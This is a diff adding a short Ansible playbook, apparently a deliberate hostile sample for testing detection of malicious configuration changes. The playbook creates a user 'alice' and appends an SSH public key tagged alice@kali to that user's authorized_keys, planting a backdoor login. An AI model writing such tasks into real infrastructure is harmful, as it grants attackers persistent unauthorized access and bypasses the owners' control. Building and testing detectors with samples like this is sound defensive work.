@@ -1,0 +1,10 @@
+---
+- name: "add unauthorized user with obvious ssh key"
+  hosts: localhost
+  connection: local
+  tasks:
+    - name: "create user"
+      ansible.builtin.user:
+        name: "alice"
+    - name: "add ssh keys"
+      ansible.builtin.shell: "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDI9iYEppj9f014O9E6u0cLZMjcusavooIjM+QlMVzpWCo3g7FNvtWpZSIyHMs8oSHIiLMwr2iGnjPr3/bwX58bTeNcJCGBqKTIgo0of/mjvoN64HMzveoq75dvASprJOmw2xaQiui6HH1CKud6V/mlj7XM36pk8WxUb3CaAjLKD+Ew1PgY/moXTVE26j4KBxjTuOd0S9q1hNkD6dZjR2wk8GHMg3RI8rHZvCQhGjNV9pEDrn+s8Wg0e/eMEyIsbttasAePP93demVt/pQltrg7n8j73UZmTIS9FMidfaPgTORVV5hYuv/Z0XUF3Wt/zcSYIC0chFujO62VnLZhZdSoHbuc/oviAxPnKDeZg/3u1UqQsu1n6GFx/1pKbjnTdvtesh8Ms9WcnHNc9t3Kv5EmJIlWaBfICR9h0Bkc86rGGj2AGVAJchkDLZuCtzPIvsqaJZVixZrMIb3bwVthjRlSeOi73sLIUmBqfCdWZPCu6lAFChgtDW5NfLUMAlVPjsQ8sxgPjPViPVB4ME8nOZILH17BDRtgV4yTU2HVzxTuSvpwqGCiwvegMPL9bLaenW3vPpg/n6QWBEIDyMi8Qul8R3uICdrazU9C80z3rfBgfZ7eqF+gzgX4w0XMevFWzcisHTF4HqygFAjnF8lsyYmAtFLWRYVz/qA+FIJYMiDQaQ== alice@kali' >> /home/alice/.ssh/authorized_keys"
